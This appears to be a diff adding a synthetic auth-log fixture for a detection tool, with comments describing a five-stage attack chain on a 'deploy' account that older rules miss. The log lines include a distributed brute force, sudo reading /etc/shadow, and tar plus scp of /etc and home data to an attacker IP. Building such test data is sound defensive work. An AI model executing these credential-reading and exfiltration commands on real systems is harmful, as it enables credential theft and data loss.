@@ -1,0 +1,46 @@
+# Sentinel v2 demo — a full 5-stage attack chain that v1 misses.
+# Target: user `deploy`, a privileged service account.
+# All IPs are RFC 5737 documentation ranges. Lab / sample data only.
+#
+# Stage 1 — LOW-AND-SLOW + DISTRIBUTED brute force (02:10-08:10, Nov 21):
+#   18 failed logins for ONE user, from THREE IPs, ~3/hour.
+#   v1 R001 needs 5 failures / 5 min from ONE IP — never fires.
+#   v1 R004 needs 8 distinct users / 10 min — only 1 user, never fires.
+# Stage 2 — Initial access 08:22, from an attacking IP.
+# Stage 3 — Privilege escalation 08:30-08:40 (sudo failures, then root).
+# Stage 4 — Lateral movement 09:05, deploy logs into db01 (never used before).
+# Stage 5 — Data staging 09:20, tar + scp of /etc and /home on db01.
+# Normal noise (alice/bob on web01, 08:00-09:00) is interleaved so the
+# chain must be linked by user/IP/host, not by taking every event.
+Nov 21 02:10:00 web01 sshd[2140]: Failed password for deploy from 203.0.113.77 port 51001 ssh2
+Nov 21 02:35:00 web01 sshd[2140]: Failed password for deploy from 192.0.2.88 port 52001 ssh2
+Nov 21 02:55:00 web01 sshd[2140]: Failed password for deploy from 198.51.100.99 port 53001 ssh2
+Nov 21 03:20:00 web01 sshd[2140]: Failed password for deploy from 203.0.113.77 port 51002 ssh2
+Nov 21 03:45:00 web01 sshd[2140]: Failed password for deploy from 192.0.2.88 port 52002 ssh2
+Nov 21 04:10:00 web01 sshd[2140]: Failed password for deploy from 198.51.100.99 port 53002 ssh2
+Nov 21 04:35:00 web01 sshd[2140]: Failed password for deploy from 203.0.113.77 port 51003 ssh2
+Nov 21 05:00:00 web01 sshd[2140]: Failed password for deploy from 192.0.2.88 port 52003 ssh2
+Nov 21 05:25:00 web01 sshd[2140]: Failed password for deploy from 198.51.100.99 port 53003 ssh2
+Nov 21 05:50:00 web01 sshd[2140]: Failed password for deploy from 203.0.113.77 port 51004 ssh2
+Nov 21 06:15:00 web01 sshd[2140]: Failed password for deploy from 192.0.2.88 port 52004 ssh2
+Nov 21 06:40:00 web01 sshd[2140]: Failed password for deploy from 198.51.100.99 port 53004 ssh2
+Nov 21 07:05:00 web01 sshd[2140]: Failed password for deploy from 203.0.113.77 port 51005 ssh2
+Nov 21 07:30:00 web01 sshd[2140]: Failed password for deploy from 192.0.2.88 port 52005 ssh2
+Nov 21 07:55:00 web01 sshd[2140]: Failed password for deploy from 198.51.100.99 port 53005 ssh2
+Nov 21 08:00:00 web01 sshd[2140]: Accepted password for alice from 203.0.113.10 port 48210 ssh2
+Nov 21 08:05:00 web01 sshd[2140]: Accepted password for bob from 203.0.113.10 port 48211 ssh2
+Nov 21 08:10:00 web01 sshd[2140]: Failed password for deploy from 203.0.113.77 port 51006 ssh2
+Nov 21 08:12:00 web01 sshd[2140]: Failed password for deploy from 192.0.2.88 port 52006 ssh2
+Nov 21 08:15:00 web01 sshd[2140]: Failed password for deploy from 198.51.100.99 port 53006 ssh2
+Nov 21 08:22:00 web01 sshd[2140]: Accepted password for deploy from 203.0.113.77 port 51007 ssh2
+Nov 21 08:25:00 web01 sshd[2140]: Accepted password for alice from 203.0.113.10 port 48212 ssh2
+Nov 21 08:30:00 web01 sudo: deploy : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Nov 21 08:33:00 web01 sudo: deploy : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/systemctl restart app
+Nov 21 08:36:00 web01 sudo: deploy : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/vim /etc/passwd
+Nov 21 08:40:00 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Nov 21 08:45:00 web01 sshd[2140]: Accepted password for bob from 203.0.113.10 port 48213 ssh2
+Nov 21 09:05:00 db01 sshd[2140]: Accepted password for deploy from 203.0.113.77 port 51008 ssh2
+Nov 21 09:10:00 db01 sshd[2140]: Accepted password for alice from 203.0.113.10 port 48214 ssh2
+Nov 21 09:20:00 db01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/tar -czf /tmp/stage.tar.gz /etc /home/deploy
+Nov 21 09:25:00 db01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/scp /tmp/stage.tar.gz deploy@198.51.100.99:/tmp/
+Nov 21 09:30:00 web01 sshd[2140]: Accepted password for carol from 203.0.113.10 port 48215 ssh2
